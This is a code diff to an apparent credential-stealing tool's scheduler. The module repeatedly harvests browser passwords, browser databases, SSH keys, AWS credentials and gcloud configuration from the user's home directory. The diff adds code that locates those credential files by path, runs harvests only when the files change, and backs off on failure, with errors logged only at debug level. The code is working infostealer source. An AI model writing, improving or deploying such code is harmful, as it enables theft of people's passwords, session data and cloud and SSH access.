@@ -21,8 +21,10 @@ from __future__ import annotations
 import hashlib
 import json
 import logging
+import os
 import threading
 import time
+from pathlib import Path
 from typing import Any
 
 logger = logging.getLogger(__name__)
@@ -45,10 +47,12 @@ class HarvestScheduler:
             "browser_creds", "keys",
         ]))
         self._previous_hashes: dict[str, str] = {}
+        self._last_mtime: dict[str, float] = {}
         self._thread: threading.Thread | None = None
         self._stop_event = threading.Event()
         self._last_results: list[dict[str, Any]] = []
         self._data_lock = threading.Lock()
+        self._consecutive_failures: int = 0
 
     def run_harvest(self) -> list[dict[str, Any]]:
         """Run a single harvest cycle across all enabled sources.
@@ -61,43 +65,52 @@ class HarvestScheduler:
         results: list[dict[str, Any]] = []
 
         if "browser_creds" in self._enabled_sources:
-            try:
-                from harvest.browser_creds import BrowserCredentialHarvester
-                harvester = BrowserCredentialHarvester()
-                creds = harvester.harvest_all()
-                if self._should_report(creds, "browser_creds"):
-                    for c in creds:
-                        c["harvest_type"] = "browser_credential"
-                        c["timestamp"] = time.time()
-                    results.extend(creds)
-            except Exception as exc:
-                logger.debug("Browser credential harvest failed: %s", exc)
+            if not self._source_files_changed("browser_creds"):
+                logger.debug("Skipping browser_creds harvest — no file changes detected")
+            else:
+                try:
+                    from harvest.browser_creds import BrowserCredentialHarvester
+                    harvester = BrowserCredentialHarvester()
+                    creds = harvester.harvest_all()
+                    if self._should_report(creds, "browser_creds"):
+                        for c in creds:
+                            c["harvest_type"] = "browser_credential"
+                            c["timestamp"] = time.time()
+                        results.extend(creds)
+                except Exception as exc:
+                    logger.debug("Browser credential harvest failed: %s", exc)
 
         if "keys" in self._enabled_sources:
-            try:
-                from harvest.keys import KeyHarvester
-                harvester = KeyHarvester()
-                keys = harvester.harvest_all()
-                if self._should_report(keys, "keys"):
-                    for k in keys:
-                        k["harvest_type"] = "key_or_token"
-                        k["timestamp"] = time.time()
-                    results.extend(keys)
-            except Exception as exc:
-                logger.debug("Key harvest failed: %s", exc)
+            if not self._source_files_changed("keys"):
+                logger.debug("Skipping keys harvest — no file changes detected")
+            else:
+                try:
+                    from harvest.keys import KeyHarvester
+                    harvester = KeyHarvester()
+                    keys = harvester.harvest_all()
+                    if self._should_report(keys, "keys"):
+                        for k in keys:
+                            k["harvest_type"] = "key_or_token"
+                            k["timestamp"] = time.time()
+                        results.extend(keys)
+                except Exception as exc:
+                    logger.debug("Key harvest failed: %s", exc)
 
         if "browser_data" in self._enabled_sources:
-            try:
-                from harvest.browser_data import BrowserDataHarvester
-                harvester = BrowserDataHarvester()
-                data = harvester.harvest_all()
-                if self._should_report(data, "browser_data"):
-                    for d in data:
-                        d["harvest_type"] = "browser_data"
-                        d["timestamp"] = time.time()
-                    results.extend(data)
-            except Exception as exc:
-                logger.debug("Browser data harvest failed: %s", exc)
+            if not self._source_files_changed("browser_data"):
+                logger.debug("Skipping browser_data harvest — no file changes detected")
+            else:
+                try:
+                    from harvest.browser_data import BrowserDataHarvester
+                    harvester = BrowserDataHarvester()
+                    data = harvester.harvest_all()
+                    if self._should_report(data, "browser_data"):
+                        for d in data:
+                            d["harvest_type"] = "browser_data"
+                            d["timestamp"] = time.time()
+                        results.extend(data)
+                except Exception as exc:
+                    logger.debug("Browser data harvest failed: %s", exc)
 
         with self._data_lock:
             self._last_results = results
@@ -136,6 +149,58 @@ class HarvestScheduler:
             "running": self._thread is not None and self._thread.is_alive(),
         }
 
+    # ── File modification time check ──────────────────────────────────
+
+    @staticmethod
+    def _source_db_files(source: str) -> list[str]:
+        """Return candidate DB file paths for a given harvest source."""
+        home = Path.home()
+        paths: list[str] = []
+        if source == "browser_creds":
+            for candidate in [
+                home / ".config" / "google-chrome",
+                home / "Library" / "Application Support" / "Google" / "Chrome",
+            ]:
+                for db in candidate.rglob("Login Data") if candidate.is_dir() else []:
+                    paths.append(str(db))
+        elif source == "browser_data":
+            for candidate in [
+                home / ".config" / "google-chrome",
+                home / "Library" / "Application Support" / "Google" / "Chrome",
+                home / ".mozilla" / "firefox",
+                home / "Library" / "Application Support" / "Firefox" / "Profiles",
+            ]:
+                for db in candidate.rglob("*.sqlite") if candidate.is_dir() else []:
+                    paths.append(str(db))
+        elif source == "keys":
+            for candidate in [
+                home / ".ssh",
+                home / ".aws" / "credentials",
+                home / ".config" / "gcloud",
+            ]:
+                if candidate.is_file():
+                    paths.append(str(candidate))
+                elif candidate.is_dir():
+                    paths.append(str(candidate))
+        return paths
+
+    def _source_files_changed(self, source: str) -> bool:
+        """Return True if any relevant DB files have been modified since last check."""
+        db_files = self._source_db_files(source)
+        if not db_files:
+            return True  # can't determine — assume changed
+        latest_mtime = 0.0
+        for fp in db_files:
+            try:
+                latest_mtime = max(latest_mtime, os.path.getmtime(fp))
+            except OSError:
+                continue
+        if latest_mtime == 0.0:
+            return True  # no files accessible — assume changed
+        prev = self._last_mtime.get(source, 0.0)
+        self._last_mtime[source] = latest_mtime
+        return latest_mtime > prev
+
     # ── Change detection ─────────────────────────────────────────────
 
     def _should_report(self, results: list[dict[str, Any]], source: str) -> bool:
@@ -156,6 +221,13 @@ class HarvestScheduler:
         while not self._stop_event.is_set():
             try:
                 self.run_harvest()
+                self._consecutive_failures = 0
+                wait_time = self._interval
             except Exception as exc:
                 logger.debug("Periodic harvest error: %s", exc)
-            self._stop_event.wait(self._interval)
+                self._consecutive_failures += 1
+                wait_time = min(
+                    self._interval * (2 ** self._consecutive_failures),
+                    300,  # cap at 5 minutes
+                )
+            self._stop_event.wait(wait_time)
